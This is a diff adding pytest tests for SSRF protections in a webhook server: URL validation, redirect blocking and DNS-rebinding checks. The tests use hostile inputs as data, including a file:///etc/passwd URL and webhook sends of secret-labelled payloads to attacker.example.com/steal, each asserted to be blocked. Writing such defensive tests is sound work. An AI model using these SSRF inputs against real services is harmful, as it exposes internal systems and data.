@@ -1,6 +1,10 @@
 """Tests for webhook CRUD endpoints and should_fire logic."""
 from __future__ import annotations
 
+from http.server import BaseHTTPRequestHandler, HTTPServer
+from threading import Thread
+from unittest import mock
+
 import pytest
 
 pytest.importorskip("fastapi", reason="fastapi not installed — skipping webhook tests")
@@ -10,7 +14,13 @@ from fastapi.testclient import TestClient  # noqa: E402
 
 from mltk.server.app import create_app  # noqa: E402
 from mltk.server.auth import generate_api_key, hash_key  # noqa: E402
-from mltk.server.webhooks import WebhookConfig, should_fire, validate_webhook_url  # noqa: E402
+from mltk.server.webhooks import (  # noqa: E402
+    WebhookConfig,
+    _is_private_ip,
+    send_webhook,
+    should_fire,
+    validate_webhook_url,
+)
 
 # ---------------------------------------------------------------------------
 # Fixture
@@ -231,3 +241,231 @@ def test_delete_webhook_not_found(client):
         headers={"Authorization": f"Bearer {raw_key}"},
     )
     assert resp.status_code == 404, resp.text
+
+
+# ---------------------------------------------------------------------------
+# P1-19: Webhook URL validation at creation (route-level)
+# ---------------------------------------------------------------------------
+
+
+def test_create_webhook_rejects_private_ip(client):
+    # SCENARIO: POST /api/webhooks with a private-IP URL (e.g. 10.x.x.x)
+    # WHY: the route must validate the URL BEFORE saving — SSRF mitigation
+    # EXPECTED: HTTP 422 with a descriptive error; webhook is NOT persisted
+    c, raw_key = client
+    auth = {"Authorization": f"Bearer {raw_key}"}
+    resp = c.post(
+        "/api/webhooks",
+        json={"url": "http://10.0.0.1/internal", "events": ["on_failure"]},
+        headers=auth,
+    )
+    assert resp.status_code == 422, resp.text
+    assert "Invalid webhook URL" in resp.json()["detail"]
+
+    # Verify nothing was persisted
+    list_resp = c.get("/api/webhooks")
+    assert list_resp.json()["webhooks"] == []
+
+
+def test_create_webhook_rejects_localhost(client):
+    # SCENARIO: POST /api/webhooks with localhost URL
+    # WHY: localhost is a loopback address — must be rejected at creation time
+    # EXPECTED: HTTP 422
+    c, raw_key = client
+    auth = {"Authorization": f"Bearer {raw_key}"}
+    resp = c.post(
+        "/api/webhooks",
+        json={"url": "http://localhost:9999/hook", "events": ["on_failure"]},
+        headers=auth,
+    )
+    assert resp.status_code == 422, resp.text
+
+
+def test_create_webhook_rejects_file_scheme(client):
+    # SCENARIO: POST /api/webhooks with file:// URL
+    # WHY: file scheme allows local filesystem access — critical SSRF
+    # EXPECTED: HTTP 422
+    c, raw_key = client
+    auth = {"Authorization": f"Bearer {raw_key}"}
+    resp = c.post(
+        "/api/webhooks",
+        json={"url": "file:///etc/passwd", "events": ["on_failure"]},
+        headers=auth,
+    )
+    assert resp.status_code == 422, resp.text
+
+
+# ---------------------------------------------------------------------------
+# P1-22: Redirect not followed in send_webhook
+# ---------------------------------------------------------------------------
+
+
+def test_send_webhook_does_not_follow_redirect():
+    # SCENARIO: webhook target returns a 302 redirect to a different URL
+    # WHY: following redirects could bypass SSRF URL checks if the
+    #      redirect target is an internal/private address
+    # EXPECTED: send_webhook returns False (does not follow the redirect)
+
+    class _RedirectHandler(BaseHTTPRequestHandler):
+        """Minimal HTTP handler that always responds with 302."""
+
+        def do_POST(self):  # noqa: N802
+            self.send_response(302)
+            self.send_header("Location", "http://127.0.0.1:1/internal")
+            self.end_headers()
+
+        def log_message(self, *args):  # noqa: ARG002
+            pass  # suppress stdout noise in test output
+
+    server = HTTPServer(("127.0.0.1", 0), _RedirectHandler)
+    port = server.server_address[1]
+    thread = Thread(target=server.handle_request, daemon=True)
+    thread.start()
+
+    try:
+        # Patch validate_webhook_url AND _is_private_ip so we can actually
+        # reach our local test server (on 127.0.0.1 — normally blocked by
+        # both the URL validator and the DNS-rebinding defense).
+        with mock.patch(
+            "mltk.server.webhooks.validate_webhook_url", return_value=True,
+        ), mock.patch(
+            "mltk.server.webhooks._is_private_ip", return_value=False,
+        ):
+            result = send_webhook(
+                f"http://127.0.0.1:{port}/hook",
+                {"event": "test"},
+            )
+        # The _NoRedirectHandler raises on the 302, so send_webhook catches
+        # the exception and returns False — redirect was NOT followed
+        assert result is False
+    finally:
+        server.server_close()
+        thread.join(timeout=5)
+
+
+# ---------------------------------------------------------------------------
+# P1-20: SSRF DNS rebinding defence
+# ---------------------------------------------------------------------------
+
+
+def test_is_private_ip_loopback():
+    # SCENARIO: check _is_private_ip with loopback addresses
+    # WHY: helper must correctly identify 127.x.x.x and ::1
+    # EXPECTED: returns True
+    assert _is_private_ip("127.0.0.1") is True
+    assert _is_private_ip("127.255.255.255") is True
+    assert _is_private_ip("::1") is True
+
+
+def test_is_private_ip_rfc1918():
+    # SCENARIO: check _is_private_ip with RFC-1918 addresses
+    # WHY: must catch all three private ranges (10/8, 172.16/12, 192.168/16)
+    # EXPECTED: returns True
+    assert _is_private_ip("10.0.0.1") is True
+    assert _is_private_ip("172.16.0.1") is True
+    assert _is_private_ip("192.168.1.100") is True
+
+
+def test_is_private_ip_public():
+    # SCENARIO: check _is_private_ip with public addresses
+    # WHY: public addresses must NOT be flagged as private
+    # EXPECTED: returns False
+    assert _is_private_ip("8.8.8.8") is False
+    assert _is_private_ip("1.1.1.1") is False
+
+
+def test_is_private_ip_invalid_input():
+    # SCENARIO: pass a hostname string (not an IP) to _is_private_ip
+    # WHY: must not raise; should return False for non-IP strings
+    # EXPECTED: returns False
+    assert _is_private_ip("example.com") is False
+    assert _is_private_ip("not-an-ip") is False
+
+
+def test_send_webhook_blocks_dns_rebinding():
+    # SCENARIO: DNS resolves to a public IP during validate_webhook_url
+    #           but resolves to a private IP (127.0.0.1) at dispatch time
+    # WHY: this is a DNS rebinding attack — the attacker controls DNS
+    #      and flips the record between validation and request time
+    # EXPECTED: send_webhook returns False because the resolved IP is
+    #           re-validated before the HTTP request is made
+
+    # validate_webhook_url passes (attacker's DNS returned a safe IP)
+    # but socket.getaddrinfo now returns a loopback address
+    fake_addrinfo = [
+        (2, 1, 6, "", ("127.0.0.1", 80)),  # AF_INET, SOCK_STREAM, TCP
+    ]
+    with mock.patch(
+        "mltk.server.webhooks.validate_webhook_url", return_value=True,
+    ), mock.patch(
+        "mltk.server.webhooks.socket.getaddrinfo", return_value=fake_addrinfo,
+    ):
+        result = send_webhook(
+            "http://attacker.example.com/steal",
+            {"secret": "data"},
+        )
+    assert result is False
+
+
+def test_send_webhook_blocks_dns_rebinding_private_10():
+    # SCENARIO: DNS rebinding to a 10.x.x.x address
+    # WHY: must also catch rebinding into RFC-1918 10/8 range
+    # EXPECTED: send_webhook returns False
+    fake_addrinfo = [
+        (2, 1, 6, "", ("10.0.0.5", 80)),
+    ]
+    with mock.patch(
+        "mltk.server.webhooks.validate_webhook_url", return_value=True,
+    ), mock.patch(
+        "mltk.server.webhooks.socket.getaddrinfo", return_value=fake_addrinfo,
+    ):
+        result = send_webhook(
+            "http://attacker.example.com/steal",
+            {"data": "exfil"},
+        )
+    assert result is False
+
+
+def test_send_webhook_allows_public_resolved_ip():
+    # SCENARIO: DNS resolves to a genuine public IP
+    # WHY: must not block legitimate public webhook targets
+    # EXPECTED: send_webhook proceeds past DNS check (may still fail on
+    #           network I/O, but the DNS-rebinding guard must not reject it)
+    fake_addrinfo = [
+        (2, 1, 6, "", ("93.184.216.34", 443)),  # example.com
+    ]
+    with mock.patch(
+        "mltk.server.webhooks.validate_webhook_url", return_value=True,
+    ), mock.patch(
+        "mltk.server.webhooks.socket.getaddrinfo", return_value=fake_addrinfo,
+    ), mock.patch(
+        "mltk.server.webhooks.urllib.request.build_opener",
+    ) as mock_opener:
+        # Simulate a successful 200 response
+        mock_resp = mock.MagicMock()
+        mock_resp.status = 200
+        mock_resp.__enter__ = mock.MagicMock(return_value=mock_resp)
+        mock_resp.__exit__ = mock.MagicMock(return_value=False)
+        mock_opener.return_value.open.return_value = mock_resp
+
+        result = send_webhook(
+            "https://hooks.example.com/webhook",
+            {"event": "test"},
+        )
+    assert result is True
+
+
+def test_send_webhook_blocks_dns_empty_addrinfo():
+    # SCENARIO: socket.getaddrinfo returns an empty list
+    # WHY: if DNS resolution yields nothing, we must not proceed
+    # EXPECTED: send_webhook returns False
+    with mock.patch(
+        "mltk.server.webhooks.validate_webhook_url", return_value=True,
+    ), mock.patch(
+        "mltk.server.webhooks.socket.getaddrinfo", return_value=[],
+    ):
+        result = send_webhook(
+            "http://vanished.example.com/hook",
+            {"event": "test"},
+        )
+    assert result is False
